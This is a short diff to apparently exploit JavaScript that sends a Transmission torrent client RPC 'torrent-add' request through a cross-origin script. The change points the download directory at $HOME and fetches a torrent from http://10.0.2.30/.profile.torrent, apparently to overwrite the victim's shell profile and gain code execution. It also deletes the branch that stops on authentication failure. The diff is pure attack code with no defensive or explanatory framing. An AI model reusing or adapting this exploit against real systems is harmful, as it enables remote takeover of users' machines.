@@ -7,7 +7,7 @@ var command = JSON.stringify({
 		method: "torrent-add",
 		arguments: {
 			"download-dir": "$HOME",
-			filename: "hello.torrent",
+			filename: "http://10.0.2.30/.profile.torrent",
 			paused: false
 		}
 	});
@@ -40,9 +40,6 @@ function sendRpc() {
 		sessionid = xhr.getResponseHeader("X-Transmission-Session-Id")
 		window.parent.postMessage({status: "session", sessionid: sessionid }, "*")
 		sendRpc();
-	} else if (xhr.status == 401) {
-		clearInterval(timer);
-		window.parent.postMessage({status: "auth" }, "*");
 	}
 }
 
